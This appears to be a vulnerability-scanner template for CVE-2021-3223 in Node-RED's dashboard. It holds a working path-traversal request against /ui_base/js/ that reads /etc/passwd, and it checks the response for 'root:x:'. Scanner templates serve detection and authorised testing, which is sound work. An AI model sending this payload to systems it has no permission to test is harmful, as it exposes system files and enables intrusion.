name: Node-RED ui_base Arbitrary File Read CVE-2021-3223
manual: true
query: title="Node-RED"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
    expression: response.status == 200 && response.body.bcontains(b"root:x:") && response.body.bcontains(b"bin:x:")
expression: r0()
detail:
  links:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3223
  - https://github.com/node-red/node-red-dashboard/issues/669
  - https://mp.weixin.qq.com/s/KRGKXAJQawXl88RBPTaAeg
  description: Node-RED is a programming tool for wiring together hardware devices,
    APIs and online services in new and interesting ways.
  tags: fileread
